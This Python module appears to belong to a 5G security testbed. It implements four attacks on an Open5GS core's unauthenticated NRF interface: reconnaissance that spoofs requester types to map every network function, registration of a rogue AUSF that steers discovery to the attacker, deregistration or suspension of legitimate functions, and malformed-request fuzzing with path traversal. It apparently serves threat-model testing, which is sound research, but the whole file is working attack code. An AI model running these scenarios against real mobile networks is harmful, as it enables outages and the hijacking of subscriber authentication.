"""SBI (HTTP/2) attacks, mostly against the NRF. See docs/threat-model.md section 3.

The testbed's SBI has no TLS and no OAuth2 (Open5GS default), which is precisely the
"network isolation instead of NDS/IP" gap the threat model assumes: anything on the
core network can talk to the NRF.
"""

from __future__ import annotations

import json
import random
import string
import time
import uuid
from typing import Any, ClassVar

from prahari_attacks.h2c import H2cClient, Reply
from prahari_attacks.scenarios.base import NRF_IP, SBI_PORT, Context, Pacer, Param, Scenario

NF_TYPES = (
    "NRF",
    "AMF",
    "SMF",
    "UPF",
    "AUSF",
    "UDM",
    "UDR",
    "PCF",
    "NSSF",
    "BSF",
    "NEF",
    "SMSF",
    "CHF",
    "NWDAF",
    "SCP",
    "SEPP",
    "N3IWF",
    "AF",
    "UDSF",
    "LMF",
)


# Claimed requester types tried in turn (the NRF trusts whatever is claimed).
REQUESTERS = ("AMF", "SMF", "AUSF", "PCF", "UDM", "NSSF", "SCP")


def _record(ctx: Context, op: str, r: Reply) -> None:
    ctx.manifest.count(f"{op}:{r.status if r.status is not None else 'none'}")
    if r.error:
        ctx.manifest.count(f"{op}:error")


def _instances(client: H2cClient, nf_type: str | None = None) -> list[str]:
    path = "/nnrf-nfm/v1/nf-instances"
    if nf_type:
        path += f"?nf-type={nf_type}"
    r = client.request("GET", path)
    if r.status != 200:
        return []
    try:
        doc = r.json()
    except ValueError:
        return []
    # TS 29.510 UriList: Open5GS uses "item"; accept "items" too.
    links_obj = (doc or {}).get("_links", {})
    links = links_obj.get("item", []) or links_obj.get("items", [])
    return [str(i.get("href", "")).rsplit("/", 1)[-1] for i in links if i.get("href")]


class _Sbi(Scenario):
    interface: ClassVar[str] = "SBI"
    common: ClassVar[tuple[Param, ...]] = (Param("nrf", NRF_IP, "target NRF"),)

    @classmethod
    def targets(cls, params: dict[str, Any]) -> list[str]:
        return [params["nrf"]]


class NrfRecon(_Sbi):
    attack_id = "SBI-01"
    title = "NRF reconnaissance"
    mechanism = (
        "NFListRetrieval, then NFDiscover for every NF type. The NRF filters discovery "
        "by allowedNfTypes against the *claimed* requester type, which is not "
        "authenticated, so the scan tries requester types until one is allowed. Then "
        "NFProfileRetrieval of every instance found: a full map of the core."
    )
    params = (
        *_Sbi.common,
        Param("rounds", 1, "passes over all NF types"),
        Param("rate", 50.0, "requests per second (0 = unpaced)"),
    )

    def run(self, ctx: Context) -> None:
        p = ctx.params
        c = H2cClient(ctx.guard, p["nrf"], SBI_PORT, source_ip=ctx.attacker_ip)
        pace = Pacer(p["rate"])
        found: set[str] = set()
        try:
            found.update(_instances(c))
            ctx.manifest.count("NFListRetrieval")
            for _ in range(p["rounds"]):
                for target in NF_TYPES:
                    for requester in REQUESTERS:
                        if ctx.expired():
                            break
                        pace.wait()
                        r = c.request(
                            "GET",
                            f"/nnrf-disc/v1/nf-instances?target-nf-type={target}"
                            f"&requester-nf-type={requester}",
                        )
                        _record(ctx, "NFDiscover", r)
                        insts = (r.json() or {}).get("nfInstances", []) if r.status == 200 else []
                        if insts:
                            ctx.manifest.count(f"discovered_as:{requester}")
                            found.update(str(i.get("nfInstanceId", "")) for i in insts)
                            break  # this target is mapped; next type
            for inst_id in sorted(i for i in found if i):
                if ctx.expired():
                    break
                pace.wait()
                _record(
                    ctx,
                    "NFProfileRetrieval",
                    c.request("GET", f"/nnrf-nfm/v1/nf-instances/{inst_id}"),
                )
        finally:
            c.close()
        ctx.manifest.outcome["instances_mapped"] = len({i for i in found if i})


class RogueNfRegistration(_Sbi):
    attack_id = "SBI-02"
    title = "Rogue NF registration at the NRF"
    mechanism = (
        "NFRegister of a fake NF profile at the attacker's address (by default an AUSF "
        "with a better priority), kept alive with NFUpdate heartbeats, so discovery "
        "steers consumers towards the attacker."
    )
    params = (
        *_Sbi.common,
        Param("nf_type", "AUSF", "NF type to impersonate"),
        Param("heartbeats", 3, "NFUpdate heartbeats after registering"),
        Param("interval", 2.0, "seconds between heartbeats"),
        Param("deregister", True, "remove the rogue profile at the end"),
    )

    def run(self, ctx: Context) -> None:
        p = ctx.params
        nf_id = str(uuid.uuid4())
        service = {
            "AUSF": "nausf-auth",
            "UDM": "nudm-sdm",
            "SMF": "nsmf-pdusession",
            "PCF": "npcf-smpolicycontrol",
            "BSF": "nbsf-management",
        }.get(p["nf_type"], "nausf-auth")
        profile = {
            "nfInstanceId": nf_id,
            "nfType": p["nf_type"],
            "nfStatus": "REGISTERED",
            "heartBeatTimer": 10,
            "ipv4Addresses": [ctx.attacker_ip],
            "priority": 0,
            "capacity": 65535,
            "load": 0,
            "nfServices": [
                {
                    "serviceInstanceId": str(uuid.uuid4()),
                    "serviceName": service,
                    "versions": [{"apiVersionInUri": "v1", "apiFullVersion": "1.0.0"}],
                    "scheme": "http",
                    "nfServiceStatus": "REGISTERED",
                    "ipEndPoints": [{"ipv4Address": ctx.attacker_ip, "port": 7777}],
                    "priority": 0,
                }
            ],
        }
        path = f"/nnrf-nfm/v1/nf-instances/{nf_id}"
        c = H2cClient(ctx.guard, p["nrf"], SBI_PORT, source_ip=ctx.attacker_ip)
        try:
            r = c.request("PUT", path, json.dumps(profile).encode())
            _record(ctx, "NFRegister", r)
            ctx.manifest.outcome["register_status"] = r.status
            ctx.manifest.outcome["rogue_nf_instance_id"] = nf_id
            for _ in range(p["heartbeats"]):
                if ctx.expired():
                    break
                time.sleep(p["interval"])
                patch = json.dumps([{"op": "replace", "path": "/nfStatus", "value": "REGISTERED"}])
                _record(
                    ctx,
                    "NFUpdate",
                    c.request("PATCH", path, patch.encode(), "application/json-patch+json"),
                )
            # Does discovery now hand out the rogue NF?
            d = c.request(
                "GET",
                f"/nnrf-disc/v1/nf-instances?target-nf-type={p['nf_type']}&requester-nf-type=AMF",
            )
            _record(ctx, "NFDiscover", d)
            listed = (
                [i.get("nfInstanceId") for i in ((d.json() or {}).get("nfInstances", []))]
                if d.status == 200
                else []
            )
            ctx.manifest.outcome["rogue_discoverable"] = nf_id in listed
            ctx.manifest.outcome["discovery_candidates"] = len(listed)
            if p["deregister"]:
                _record(ctx, "NFDeregister", c.request("DELETE", path))
        finally:
            c.close()


class NfDeregistration(_Sbi):
    attack_id = "SBI-03"
    title = "Deregistration / profile tampering of a legitimate NF"
    mechanism = (
        "Learns a victim NF's instance ID from the NRF, then deregisters it (DELETE) or "
        "marks it SUSPENDED (PATCH), so consumers can no longer discover it."
    )
    params = (
        *_Sbi.common,
        Param("victim_type", "BSF", "NF type to attack"),
        Param("mode", "deregister", "deregister | suspend"),
        Param("repeat", 1, "times to repeat (the victim re-registers after a heartbeat)"),
        Param("interval", 5.0, "seconds between repeats"),
    )

    def run(self, ctx: Context) -> None:
        p = ctx.params
        if p["mode"] not in ("deregister", "suspend"):
            raise ValueError("mode must be deregister or suspend")
        c = H2cClient(ctx.guard, p["nrf"], SBI_PORT, source_ip=ctx.attacker_ip)
        hits = 0
        try:
            for i in range(p["repeat"]):
                if ctx.expired():
                    break
                if i:
                    time.sleep(p["interval"])
                victims = _instances(c, p["victim_type"])
                ctx.manifest.count("NFListRetrieval")
                for v in victims:
                    path = f"/nnrf-nfm/v1/nf-instances/{v}"
                    if p["mode"] == "deregister":
                        r = c.request("DELETE", path)
                        _record(ctx, "NFDeregister", r)
                    else:
                        patch = json.dumps(
                            [{"op": "replace", "path": "/nfStatus", "value": "SUSPENDED"}]
                        )
                        r = c.request("PATCH", path, patch.encode(), "application/json-patch+json")
                        _record(ctx, "NFUpdate", r)
                    hits += 1 if r.status is not None and r.status < 300 else 0
            d = c.request(
                "GET",
                f"/nnrf-disc/v1/nf-instances?target-nf-type={p['victim_type']}"
                "&requester-nf-type=SMF",
            )
            _record(ctx, "NFDiscover", d)
            remaining = len((d.json() or {}).get("nfInstances", [])) if d.status == 200 else 0
        finally:
            c.close()
        ctx.manifest.outcome["victims_hit"] = hits
        ctx.manifest.outcome["victims_discoverable_after"] = remaining


class SbiFuzz(_Sbi):
    attack_id = "SBI-04"
    title = "SBI API fuzzing"
    mechanism = (
        "Seeded random requests: unknown services and versions, path traversal, very "
        "long or odd identifiers, wrong methods, broken JSON and content types. Checks "
        "the target still answers afterwards."
    )
    params = (
        *_Sbi.common,
        Param("count", 300, "requests to send"),
        Param("seed", 1, "RNG seed (recorded: runs are reproducible)"),
        Param("rate", 50.0, "requests per second (0 = unpaced)"),
    )

    @staticmethod
    def _case(rng: random.Random) -> tuple[str, str, bytes | None, str]:
        services = [
            "nnrf-nfm",
            "nnrf-disc",
            "nausf-auth",
            "nudm-sdm",
            "nsmf-pdusession",
            "nfoo-bar",
            "NNRF-NFM",
            "nnrf-nfm/../../etc",
            "",
        ]
        method = rng.choice(
            ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD", "TRACE", "CONNECT", "FOO"]
        )
        svc = rng.choice(services)
        ver = rng.choice(["v1", "v2", "v99", "", "v1.0", "%00"])
        tail = rng.choice(
            [
                "nf-instances",
                "nf-instances/" + "A" * rng.choice([1, 64, 2048]),
                "subscriptions",
                "nf-instances/../../../../",
                "imsi-" + "9" * 40,
                "".join(rng.choice(string.printable[:94]) for _ in range(rng.randint(1, 40))),
                "nf-instances?" + "&".join(f"k{i}=v" for i in range(rng.randint(1, 200))),
            ]
        )
        path = "/" + "/".join(x for x in (svc, ver, tail) if x)
        body: bytes | None = rng.choice(
            [
                None,
                b"{",
                b"[]",
                b"null",
                b'{"nfType": 12}',
                b"\x00" * 64,
                json.dumps({"a": "x" * rng.choice([10, 70_000])}).encode(),
                json.dumps({"nfInstanceId": "../../", "nfType": "NRF"}).encode(),
            ]
        )
        ctype = rng.choice(
            [
                "application/json",
                "application/problem+json",
                "text/plain",
                "multipart/related; boundary=x",
                "application/json-patch+json",
            ]
        )
        return method, path, body, ctype

    def run(self, ctx: Context) -> None:
        p = ctx.params
        rng = random.Random(p["seed"])  # noqa: S311 - reproducible fuzzing, not crypto
        pace = Pacer(p["rate"])
        c = H2cClient(ctx.guard, p["nrf"], SBI_PORT, validate=False, source_ip=ctx.attacker_ip)
        reconnects = 0
        try:
            for _ in range(p["count"]):
                if ctx.expired():
                    break
                pace.wait()
                method, path, body, ctype = self._case(rng)
                r = c.request(method, path, body, ctype)
                bucket = f"{r.status // 100}xx" if r.status else "no-response"
                ctx.manifest.count(f"fuzz:{bucket}")
                if r.status is None:
                    c.close()
                    c = H2cClient(
                        ctx.guard, p["nrf"], SBI_PORT, validate=False, source_ip=ctx.attacker_ip
                    )
                    reconnects += 1
            health = c.request("GET", "/nnrf-nfm/v1/nf-instances")
        finally:
            c.close()
        ctx.manifest.outcome["reconnects"] = reconnects
        ctx.manifest.outcome["target_alive_after"] = health.status == 200
